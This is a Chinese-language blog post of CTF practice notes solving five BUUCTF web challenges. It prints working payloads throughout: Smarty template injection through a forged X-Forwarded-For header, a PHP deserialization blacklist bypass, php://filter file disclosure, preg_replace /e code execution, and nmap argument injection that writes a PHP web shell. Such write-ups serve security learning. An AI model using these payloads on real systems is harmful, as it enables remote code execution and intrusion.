---
title: buuctf4月29日
date: 2024-4-28 19:19:20
tags: [buuctf,ctf]
categories: 刷题笔记
---

## [BJDCTF2020]The mystery of ip

### ![image-20240428191224568](C:\Users\86182\assets\image-20240428191224568.png)

Flag点进去看看，发现有个回显，是我的ip地址，着说明访问了我的ip地址，可以用伪造IP地址看看，这就想到用X-Forwarded-For，可以看到不管我们输入什么都会回显，盲猜

### ssti注入

### 输入{config}看看配置，是smarty

![image-20240428191821870](C:\Users\86182\assets\image-20240428191821870.png)

### 看看版本{$smarty.version}，上网找它特点呗

![image-20240428191846842](C:\Users\86182\assets\image-20240428191846842.png)

### 也就是if是配对用的if和/if，且if内可以运行php代码



{if system(“ls”)}{/if},这里的flag.php是假的，要查根目录下的
{if system(“ls /”)}{/if}

{if system(“cat /flag”)}{/if}
还有一种表达就是直接{system(“ls”)}

![image-20240428192441128](C:\Users\86182\assets\image-20240428192441128.png)



## [网鼎杯 2020 朱雀组]phpweb 1

1、打开界面之后界面一直在刷新，检查源代码也未发现提示信息，但是在检查中发现了两个隐藏的属性：func和p，抓包进行查看一下，结果如下：

![img](https://img2022.cnblogs.com/blog/2834847/202208/2834847-20220830215742342-1296783573.png)

![img](https://img2022.cnblogs.com/blog/2834847/202208/2834847-20220830215718355-978409354.png)

2、对两个参数与返回值进行分析，我们使用dat时一般是这种格式：date("Y-m-d+h:i:s+a")，那我们可以猜测func参数接受的是一个函数，p参数接受的是函数执行的内容，我们可以输入参数md5和1进行测试，结果如下：

![img](https://img2022.cnblogs.com/blog/2834847/202208/2834847-20220830220636777-1328039962.png)

3、那我们就尝试读取下当前的目录信息，payload：func=system&p=ls，显示hacking，应该是被过滤掉了，因此我们考虑读取下源码信息，payload：func=file_get_contents&p=php://filter/read=convert.base64-encode/resource=index.php，对获得的字母串进行base64解码，结果如下：

![img](https://img2022.cnblogs.com/blog/2834847/202208/2834847-20220830221155809-130862302.png)

![img](https://img2022.cnblogs.com/blog/2834847/202208/2834847-20220830220820620-1733656961.png)

源码如下：

```python
<?php
    $disable_fun = array("exec","shell_exec","system","passthru","proc_open","show_source","phpinfo","popen","dl","eval","proc_terminate","touch","escapeshellcmd","escapeshellarg","assert","substr_replace","call_user_func_array","call_user_func","array_filter", "array_walk",  "array_map","registregister_shutdown_function","register_tick_function","filter_var", "filter_var_array", "uasort", "uksort", "array_reduce","array_walk", "array_walk_recursive","pcntl_exec","fopen","fwrite","file_put_contents");
    function gettime($func, $p) {
        $result = call_user_func($func, $p);
        $a= gettype($result);
        if ($a == "string") {
            return $result;
        } else {return "";}
    }
    class Test {
        var $p = "Y-m-d h:i:s a";
        var $func = "date";
        function __destruct() {
            if ($this->func != "") {
                echo gettime($this->func, $this->p);
            }
        }
    }
    $func = $_REQUEST["func"];
    $p = $_REQUEST["p"];

    if ($func != null) {
        $func = strtolower($func);
        if (!in_array($func,$disable_fun)) {
            echo gettime($func, $p);
        }else {
            die("Hacker...");
        }
    }
?>
```

4、在代码里注意到了__destruct()函数，此函数会在类被销毁时调用，那我们如果反序列化一个类，在类里的参数中写上我们要执行的代码和函数，这样的话就会直接调用gettime函数，而不会执行in_array($func,$disable_fun)，那我们就绕过了黑名单的判断，payload：func=unserialize&p=O:4:"Test":2:{s:1:"p";s:2:"ls";s:4:"func";s:6:"system";} ，结果如下：

序列化代码：

```python
<?php
class Test {
    var $p = "ls";
    var $func = "system";
    }
$test = new Test();
$str = serialize($test);
print($str);
?> 
```

![img](https://img2022.cnblogs.com/blog/2834847/202208/2834847-20220830223439037-1159865422.png)

5、成功绕过黑名单获取到当前的目录信息，那我们就修改下传递的参数，查找下flag的位置信息，payload：func=unserialize&p=O:4:"Test":2:{s:1:"p";s:18:"find+/+-name+flag*";s:4:"func";s:6:"system";} ，结果如下：

序列化代码(序列化之后注意将空格修改为+号，或者采用get方式进行传输）：

```python
<?php
class Test {
    var $p = "find / -name flag*";
    var $func = "system";
    }
$test = new Test();
$str = serialize($test);
print($str);
?> 
```

![img](https://img2022.cnblogs.com/blog/2834847/202208/2834847-20220830224529466-34088818.png)

6、获得flag文件位置信息后，修改传递的参数读取下flag值，payload：func=unserialize&p=O:4:"Test":2:{s:1:"p";s:22:"cat+/tmp/flagoefiu4r93";s:4:"func";s:6:"system";} ，结果如下：

序列化代码如下(序列化之后注意将空格修改为+号，或者采用get方式进行传输）：

```python
<?php
class Test {
    var $p = "cat /tmp/flagoefiu4r93";
    var $func = "system";
    }
$test = new Test();
$str = serialize($test);
print($str);
?> 
```

![img](https://img2022.cnblogs.com/blog/2834847/202208/2834847-20220830224934681-1304625878.png)

7、这里补充下另外一种绕过黑名单的方式，第三步中的读取目录信息，可以修改payload：func=\system&p=ls，也可以获得目录信息，结果如下;

![img](https://img2022.cnblogs.com/blog/2834847/202208/2834847-20220830225414092-411832528.png)

8、然后后面的就是查找flag文件的位置、读取flag信息，结果如下：

![img](https://img2022.cnblogs.com/blog/2834847/202208/2834847-20220830230045055-616538494.png)

![img](https://img2022.cnblogs.com/blog/2834847/202208/2834847-20220830225915975-872445652.png)

9、\system可以绕过黑名单的原因：php内的" \ "在做代码执行的时候，会识别特殊字符串。

## [BSidesCF 2020]Had a bad day

![image-20240428194718770](C:\Users\86182\assets\image-20240428194718770.png)

抓包发现是get的请求有个注入点，可以进行修改，但是发现只能写含有woofers and meowers的单词

![image-20240428194915353](C:\Users\86182\assets\image-20240428194915353.png)

再次写woofers.php试试

![image-20240428195136220](C:\Users\86182\assets\image-20240428195136220.png)

发现php双写了，就可以确定加了一个.php文件

后缀有.php的可以想到php伪协议php://filter/read=convert.base64-encode/resourse=index.php(这次将后缀删掉)

获取源码：

<html>
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="description" content="Images that spark joy">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0">
    <title>Had a bad day?</title>
    <link rel="stylesheet" href="css/material.min.css">
    <link rel="stylesheet" href="css/style.css">
  </head>
  <body>
    <div class="page-layout mdl-layout mdl-layout--fixed-header mdl-js-layout mdl-color--grey-100">
      <header class="page-header mdl-layout__header mdl-layout__header--scroll mdl-color--grey-100 mdl-color-text--grey-800">
        <div class="mdl-layout__header-row">
          <span class="mdl-layout-title">Had a bad day?</span>
          <div class="mdl-layout-spacer"></div>
        <div>
      </header>
      <div class="page-ribbon"></div>
      <main class="page-main mdl-layout__content">
        <div class="page-container mdl-grid">
          <div class="mdl-cell mdl-cell--2-col mdl-cell--hide-tablet mdl-cell--hide-phone"></div>
          <div class="page-content mdl-color--white mdl-shadow--4dp content mdl-color-text--grey-800 mdl-cell mdl-cell--8-col">
            <div class="page-crumbs mdl-color-text--grey-500">
            </div>
            <h3>Cheer up!</h3>
              <p>
                Did you have a bad day? Did things not go your way today? Are you feeling down? Pick an option and let the adorable images cheer you up!
              </p>
              <div class="page-include">
              <?php
				$file = $_GET['category'];

				if(isset($file))
				{
					if( strpos( $file, "woofers" ) !==  false || strpos( $file, "meowers" ) !==  false || strpos( $file, "index")){
						include ($file . '.php');
					}
					else{
						echo "Sorry, we currently only support woofers and meowers.";
					}
				}
				?>
			</div>
	      <form action="index.php" method="get" id="choice">
	          <center><button onclick="document.getElementById('choice').submit();" name="category" value="woofers" class="mdl-button mdl-button--colored mdl-button--raised mdl-js-button mdl-js-ripple-effect" data-upgraded=",MaterialButton,MaterialRipple">Woofers<span class="mdl-button__ripple-container"><span class="mdl-ripple is-animating" style="width: 189.356px; height: 189.356px; transform: translate(-50%, -50%) translate(31px, 25px);"></span></span></button>
	          <button onclick="document.getElementById('choice').submit();" name="category" value="meowers" class="mdl-button mdl-button--colored mdl-button--raised mdl-js-button mdl-js-ripple-effect" data-upgraded=",MaterialButton,MaterialRipple">Meowers<span class="mdl-button__ripple-container"><span class="mdl-ripple is-animating" style="width: 189.356px; height: 189.356px; transform: translate(-50%, -50%) translate(31px, 25px);"></span></span></button></center>
	      </form>
	
	      </div>
	    </div>
	  </main>
	</div>
	<script src="js/material.min.js"></script>
  </body>
</html>

### php伪协议添加一个必须要的单词不会影响正常的包含

```
php://filter/read=convert.base64-encode/woofers/resource=index
```

这样提交的参数既包含有woofers这个字符串，也不会影响正常的包含，得到Flag.php：

[![img](https://img2020.cnblogs.com/blog/1212355/202003/1212355-20200326212959322-1950812728.png)](https://img2020.cnblogs.com/blog/1212355/202003/1212355-20200326212959322-1950812728.png)

解码得到Flag：



```
<!-- Can you read this flag? -->
<?php
 // flag{a4aaba40-84f9-4b7a-b269-d025b03676a1}
?>
```

## [BJDCTF2020]ZJCTF，不过如此

4月27日的题目[ZJCTF 2019]NiZhuanSiWei

第二个PHP伪协议

所有的

?text=data://text/plain,I have a dream&file=php://filter/read=convert.base64-encode/resource=next.php

解码后的代码

<?php
$id = $_GET['id'];
$_SESSION['id'] = $id;

function complex($re, $str) {
    return preg_replace(
        '/(' . $re . ')/ei',
        'strtolower("\\1")',
        $str
    );
}

foreach($_GET as $re => $str) {
    echo complex($re, $str). "\n";
}

function getFlag(){
	@eval($_GET['cmd']);
}

这里的漏洞出在**preg_replace** **/e** 模式下

e模式下的preg_replace可以让第二个参数'替换字符串'当作代码执行，但是这里第二个参数是不可变的，但因为有这种特殊的情况，正则表达式模式或部分模式两边添加圆括号会将相关匹配存储到一个临时缓存区，并且从1开始排序，而strtolower("\1")正好表达的就是匹配区的第一个（\\1=\1），从而我们如果匹配可以，则可以将函数实现。
比如我们传入 ?.*=**{${phpinfo()}}**

原句：preg_replace('/(' . $re . ')/ei','strtolower("\\1")',$str); 就变成preg_replace('/(' .* ')/ei','strtolower("\\1")',**{${phpinfo()}}**);

又因为$_GET传入首字母是非法字符时候会把  .（点号）改成下划线，因此得将\.*换成\s*

所有payload：?\S*=${getFlag()}&cmd=system('ls /'); 

![img](https://img2022.cnblogs.com/blog/2729166/202206/2729166-20220627134114716-1034484069.png)

 



 终于看到了flag，然后将cmd里改成cat /flag即可

?\S*=${getFlag()}&cmd=system('cat /flag'); 

![img](https://img2022.cnblogs.com/blog/2729166/202206/2729166-20220627134226627-1152733174.png)

## [BUUCTF 2018]Online Tool

![image-20240428210310186](C:\Users\86182\assets\image-20240428210310186.png)



nmap -T5 -sT -Pn --host-timeout 2 -F host -T<0-5> : 速度/时间模板参数，指定了扫描的速度。 -sT : 使用TCP进行扫描。 -Pn : 将所有主机视为在在线，跳过主机发现。 --host-timeout : 设置超时时间。设置为2秒，即如果目标主机在2秒内没有响应，Nmap将放弃该主机的扫描。 -F : 进行快速扫描，用于快速识别目标主机上开放的常见端口，而不扫描所有的端口。

> escapeshellarg — 把字符串转码为可以在 shell 命令里使用的参数
> 功能 ：`escapeshellarg()` 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，
> 这样以确保能够直接将一个字符串传入 shell 函数，shell 函数包含 `exec()`, `system()` 执行运算符(反引号)

> escapeshellcmd — shell 元字符转义
> 功能：`escapeshellcmd()` 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。
> 此函数保证用户输入的数据在传送到 `exec()` 或 `system()` 函数，或者 执行操作符 之前进行转义。
>
> 反斜线（\）会在以下字符之前插入：
> &#;`|?~<>^()[]{}$*, \x0A 和 \xFF*。 *’ 和 “ 仅在不配对儿的时候被转义。
> 在 Windows 平台上，所有这些字符以及 % 和 ! 字符都会被空格代替。

构建payload：`?host=' <?php eval($_POST["hack"]);?> -oG hack.php '`

![image-20240428210330513](C:\Users\86182\assets\image-20240428210330513.png)

